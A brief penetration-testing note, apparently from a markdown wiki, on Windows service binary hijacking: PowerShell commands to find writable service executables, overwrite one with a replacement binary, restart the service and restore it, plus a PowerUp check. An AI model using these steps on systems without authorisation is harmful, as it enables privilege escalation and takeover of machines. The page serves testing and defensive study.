# Service binary hijacking

[← Windows services](services.md)

Need writable service executable + privileged service account + start/restart trigger.

```powershell
Get-CimInstance -ClassName Win32_Service |
  Select-Object Name,State,StartMode,StartName,PathName
sc.exe qc <service-name>
icacls 'C:\Path\To\service.exe'
sc.exe query <service-name>
```

Separate executable from arguments in `PathName`; check your effective `(M)`/`(F)` ACL. Use `sc.exe` in PowerShell.

Save binary; check exact service name/state and trigger:

```powershell
sc.exe query <service-name>
# Stop the service first if it is running and you have SERVICE_STOP.
$backup = Join-Path $env:TEMP 'service.exe.bak'
Copy-Item 'C:\Path\To\service.exe' $backup
Copy-Item '.\replacement.exe' 'C:\Path\To\service.exe'
sc.exe start <service-name>
```

Running service needs restart (`SERVICE_START` ≠ `SERVICE_STOP`). Restore original after test:

```powershell
Copy-Item $backup 'C:\Path\To\service.exe'
```

PowerUp lead; verify ACL and trigger:

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile
```

[Microsoft service access rights](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)
